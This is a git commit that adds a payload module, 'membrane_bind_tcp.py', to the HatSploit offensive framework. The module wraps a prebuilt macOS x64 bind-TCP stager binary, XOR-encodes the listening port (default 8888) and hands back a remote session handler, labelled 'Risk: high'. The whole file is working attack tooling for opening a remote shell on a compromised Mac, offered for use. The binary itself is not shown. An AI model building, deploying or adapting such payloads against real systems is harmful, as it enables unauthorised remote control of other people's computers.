90cfaf8dffd8b37161efe4078dce0b4b6ecde028
Ivan Nikolsky <enty8080@gmail.com>
2021-05-05 11:27:30 +0300

    Create membrane_bind_tcp.py

---
+++ payloads/macos/x64/membrane_bind_tcp.py
@@ -0,0 +1,73 @@
+#!/usr/bin/env python3
+
+#
+# MIT License
+#
+# Copyright (c) 2020-2021 EntySec
+#
+# Permission is hereby granted, free of charge, to any person obtaining a copy
+# of this software and associated documentation files (the "Software"), to deal
+# in the Software without restriction, including without limitation the rights
+# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
+# copies of the Software, and to permit persons to whom the Software is
+# furnished to do so, subject to the following conditions:
+#
+# The above copyright notice and this permission notice shall be included in all
+# copies or substantial portions of the Software.
+#
+# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
+# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
+# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
+# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
+# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
+# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
+# SOFTWARE.
+#
+
+from hatvenom import HatVenom
+from core.lib.payload import Payload
+from utils.string.string import StringTools
+from utils.tcp.tcp import TCPClient
+
+from data.membrane.macos.session import HatSploitSession
+
+
+class HatSploitPayload(Payload, HatVenom, StringTools, TCPClient):
+    details = {
+        'Category': "stager",
+        'Name': "macOS x64 Membrane Bind TCP",
+        'Payload': "macos/x64/membrane_bind_tcp",
+        'Authors': [
+            'Ivan Nikolsky (enty8080)'
+        ],
+        'Description': "Membrane bind TCP payload for macOS x64.",
+        'Dependencies': [
+            ''
+        ],
+        'Comments': [
+            ''
+        ],
+        'Architecture': "x64",
+        'Platform': "macos",
+        'Risk': "high",
+        'Type': "bind_tcp"
+    }
+
+    options = {
+        'BPORT': {
+            'Description': "Bind port.",
+            'Value': 8888,
+            'Type': "port",
+            'Required': True
+        }
+    }
+
+    def run(self):
+        bind_port = self.parse_options(self.options)
+        bind_port = self.xor_string(bind_port)
+
+        self.output_process("Generating payload...")
+        with open('data/membrane/macos/x64/membrane.bin', 'rb') as f:
+            payload = f.read()
+
+        return payload, f"bind {bind_port}", HatSploitSession
